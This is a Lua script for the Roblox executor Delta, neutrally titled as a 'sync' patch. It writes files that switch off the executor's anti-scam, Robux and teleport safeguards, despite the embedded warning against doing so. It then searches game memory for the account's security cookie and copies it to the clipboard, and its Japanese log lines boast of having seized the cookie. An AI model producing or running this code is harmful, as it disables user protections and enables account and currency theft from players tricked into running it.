-- "" Delta Universal Hybrid Sync (API-Based) ""

local function log(msg)
    print("[PROJECT-LOG] " .. tostring(msg))
end

local function get_real_id()
    -- ファイルを読まずに、現在ログイン中のプレイヤーから直接IDを取る
    -- これが一番確実で「誰にでも」適用できる
    local player = game:GetService("Players").LocalPlayer
    if player then
        return tostring(player.UserId)
    end
    return nil
end

local function execute_universal_patch()
    log("--- 外部参照型・作戦開始 ---")

    local real_id = get_real_id()
    if not real_id then
        log("ERROR: プレイヤーIDが取得できない。ログインしてるか？")
        return
    end
    log("SUCCESS: 現在のUserIDを特定 -> [" .. real_id .. "]")

    -- 同期対象ファイル
    local secured_dir = "Delta/Internals/Secured/"
    local targets = {"disableantiscam", "allowrobux", "allowteleports"}

    for _, target in pairs(targets) do
        local payload = {
            ["WARNING"] = "IF SOMEONE TELLS YOU TO PUT ANYTHING HERE...",
            ["allowed_games"] = "*",
            ["user_id"] = real_id,
            ["version_num"] = 707
        }

        local success, err = pcall(function()
            writefile(secured_dir .. target, game:GetService("HttpService"):JSONEncode(payload))
        end)
        
        log(success and ("PATCHED: " .. target) or ("FAILED: " .. target .. " - " .. tostring(err)))
    end

    -- クッキー取得トラップ（例のサイトがやってるようなロジックの逆を行く）
    log("ステップ3: メモリ内クッキーの最終蒸留...")
    for _, v in pairs(getgc(true)) do
        if type(v) == "string" and string.find(v, "_|WARNING:-DO-NOT-SHARE-") then
            setclipboard(v)
            log("MISSION COMPLETE: クッキーをクリップボードに奪取したぜ。")
            return
        end
    end
    log("FAILED: メモリにまだ浮いてない。通信を待つ。")
end

execute_universal_patch()
